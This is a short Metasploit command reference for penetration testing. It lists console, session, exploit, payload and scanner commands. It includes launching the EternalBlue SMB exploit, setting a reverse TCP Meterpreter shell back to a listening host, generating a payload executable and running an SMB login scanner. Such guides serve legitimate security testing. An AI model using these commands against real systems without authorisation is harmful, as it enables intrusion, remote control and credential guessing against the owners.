## Basic Commands

-   `search`: Search the exploit and module database
-   `use`: Use a specific exploit or module
-   `show options`: Display the options for a module
-   `show advanced`: Display the advanced options for a module, including payload
-   `set`: Set an option value for a module
-   `exploit`: Run the exploit
-   `back`: Go back to the previous context
-   `exit`: Exit Metasploit

## Working with Sessions

-   `sessions`: List active sessions
-   `sessions -i`: Interact with a specific session
-   `sessions -u`: Upgrade a command shell to a Meterpreter session
-   `sessions -k`: Terminate a session

## Working with Exploits

-   `exploit/multi/handler`: Set up a multi-handler to receive incoming connections
-   `use exploit/windows/smb/ms17_010_eternalblue`: Use the EternalBlue SMB exploit
-   `set payload windows/meterpreter/reverse_tcp`: Set the payload to a reverse TCP Meterpreter shell
-   `set LHOST <local IP address>`: Set the local IP address to listen on
-   `set LPORT <local port>`: Set the local port to listen on
-   `exploit -j`: Run the exploit in the background

## Working with Payloads

-   `use payload windows/meterpreter/reverse_tcp`: Use the reverse TCP Meterpreter payload
-   `set LHOST <local IP address>`: Set the local IP address for the payload to connect to
-   `set LPORT <local port>`: Set the local port for the payload to connect to
-   `generate`: Generate an executable file with the payload embedded

## Working with Scanners

-   `use auxiliary/scanner/smb/smb_login`: Use the SMB login scanner
-   `set RHOSTS <IP range>`: Set the range of IP addresses to scan
-   `set USERNAME <username>`: Set the username to use for the scan
-   `set PASSWORD <password>`: Set the password to use for the scan
-   `run`: Run the scanner